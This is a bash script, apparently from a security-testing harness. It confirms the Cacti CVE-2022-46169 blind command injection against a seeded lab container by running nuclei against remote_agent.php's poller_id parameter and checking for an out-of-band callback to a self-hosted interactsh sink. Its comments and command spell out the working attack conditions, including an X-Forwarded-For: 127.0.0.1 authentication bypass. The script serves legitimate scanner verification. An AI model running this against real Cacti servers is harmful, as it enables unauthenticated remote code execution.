#!/usr/bin/env bash
# Confirm CVE-2022-46169 (Cacti unauthenticated OS command injection via
# remote_agent.php poller_id) OUT OF BAND, the way the verify stage's nuclei
# wrapper does — a standalone, repeatable proof of the flagship OOB result.
#
#   bash Targets/cacti/env/confirm-oob.sh
#
# WHY THIS EXISTS. ZAP's active scanner does NOT surface this bug: it is a BLIND
# command injection (the injected command runs but returns no output in the
# response), so rule 90020 fires 0 times — the documented DAST-engine detection
# ceiling for blind classes, NOT a tool defect. The bug is real and exploitable;
# the only way to CONFIRM it is out of band, by making the target call the
# self-hosted interactsh sink. This script does exactly that and asserts the
# callback landed, so "is the cacti OOB confirmation working" has a one-command
# answer that does not depend on a model routing the finding to nuclei.
#
# THE LOAD-BEARING CONFIG (each learned the hard way; see mcp/nuclei_server.py
# and Tool/docker/dns/Corefile):
#   * -dast -fuzzing-mode single — fuzz poller_id ONLY; remote_agent validates
#     host_id/local_data_ids server-side, so multi-param fuzzing corrupts them
#     and the handler bails before the injected poller_id runs. Single confirms.
#   * X-Forwarded-For: 127.0.0.1 — bypasses remote_agent's poller auth check
#     (get_client_addr trusts the header). Without it the request is rejected.
#   * local_data_ids[0]=6 — the "Device - Uptime" PHP-script-server data source
#     env/seed.sh installs; the vulnerable proc_open branch is only entered for
#     an action=2 source. Run env/seed.sh first if it is missing.
#   * interactsh.local + --dns 172.19.0.252 — the callback host must be a
#     WILDCARD the split-horizon resolver answers; a container name is not.
#
# PREREQUISITES: the persistent targets up (target-cacti seeded — env/seed.sh),
# the tool OOB stack up (docker compose -f Tool/docker/oob.yml up -d:
# target-interactsh + the dns-resolver at 172.19.0.252), and the pinned
# nuclei-templates volume populated.
set -euo pipefail

NUCLEI_IMAGE="${NUCLEI_IMAGE:-projectdiscovery/nuclei:v3.4.10}"
TEMPLATES_VOLUME="${TEMPLATES_VOLUME:-nuclei-home}"
DAST_NET="${DAST_NET:-dast-net}"
INTERACTSH_SERVER="${VERIFY_INTERACTSH_SERVER:-http://interactsh.local:8080}"
INTERACTSH_DNS="${VERIFY_INTERACTSH_DNS:-172.19.0.252}"
# The seeded sink: action=polldata against the Uptime script-server source, with
# poller_id as the parameter nuclei fuzzes.
TARGET="http://target-cacti/remote_agent.php?action=polldata&local_data_ids[0]=6&host_id=1&poller_id=1"

echo "confirming CVE-2022-46169 out of band via $INTERACTSH_SERVER (dns $INTERACTSH_DNS)"

out="$(docker run --rm --network "$DAST_NET" --dns "$INTERACTSH_DNS" \
  -v "$TEMPLATES_VOLUME:/root" "$NUCLEI_IMAGE" \
  -target "$TARGET" \
  -dast -fuzzing-mode single \
  -jsonl -no-color -disable-update-check -timeout 10 \
  -iserver "$INTERACTSH_SERVER" -interactions-cooldown-period 10 \
  -H 'X-Forwarded-For: 127.0.0.1' 2>/dev/null)"

# A confirmation is a match that carries an out-of-band interaction — an in-band
# match alone would not prove the blind class. Require both.
if echo "$out" | grep -q '"matcher-status":true' \
   && echo "$out" | grep -q '"interaction"'; then
  matched="$(echo "$out" | grep -o '"template-id":"[^"]*"' | sort -u | tr '\n' ' ')"
  echo "CONFIRMED out of band — matched: ${matched:-<template>}"
  echo "  (interactsh callback landed; the target executed the injected command)"
  exit 0
fi

echo "NOT confirmed — no out-of-band interaction observed." >&2
echo "Check: env/seed.sh ran (local_data_id 6 present), the OOB stack is up," >&2
echo "and the resolver answers *.interactsh.local -> the interactsh sink." >&2
exit 1
